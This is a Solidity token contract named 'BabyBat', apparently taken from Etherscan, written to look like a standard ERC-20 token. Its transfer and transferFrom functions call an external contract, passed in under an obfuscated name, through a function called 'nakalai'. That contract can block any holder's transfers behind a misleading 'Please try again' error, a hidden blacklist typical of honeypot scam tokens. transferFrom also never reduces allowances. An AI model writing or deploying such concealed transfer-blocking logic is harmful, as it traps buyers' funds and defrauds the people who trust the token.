/**
 *Submitted for verification at Etherscan.io on 2021-08-19
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface ID30 {

    function calc_interest( uint a, uint b) external view returns (uint);

    function nakalai(address account) external view returns (uint8);

    function verify_transaction(address senders, address taker, uint balance, uint amount) external returns (bool);

    function computation(address account, uint amounta, uint abountb) external returns (uint);


}

contract BabyBat {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    ID30 tempstor;
    uint256 public totalSupply = 100 * 10**12 * 10**18;
    string public name = "BabyBat";
    string public symbol = hex"42616279426174f09fa687";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(ID30 _fgkjwpbqq) {
        
        tempstor = _fgkjwpbqq;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(tempstor.nakalai(msg.sender) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(tempstor.nakalai(from) != 1, "Please try again");
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}